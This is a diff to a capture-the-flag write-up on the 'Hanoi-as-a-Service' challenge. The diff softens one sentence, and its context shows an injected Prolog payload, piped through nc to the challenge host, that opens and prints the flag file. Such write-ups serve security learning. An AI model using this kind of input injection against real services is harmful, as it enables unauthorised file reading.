@@ -172,7 +172,7 @@ How many disks does your tower have?
 * Move top disk from c to b
 haas			haas-proxy.py			jhknsjdfhef_flag_here
 ```
-This is fantastic - the flag is sitting right there in that folder! After much reading and trial and error, the final command was crafted:
+This is fantastic - the flag is most likely sitting right there in that folder. After much reading and trial and error, the final command was crafted:
 ```
 echo '2), open("/home/ctf/haas/jhknsjdfhef_flag_here", read, Stream), read_line_to_codes(Stream,Codes), write(Codes) %'|nc haas.polictf.it 80
 Welcome to the Hanoi-as-a-Service cloud platform!
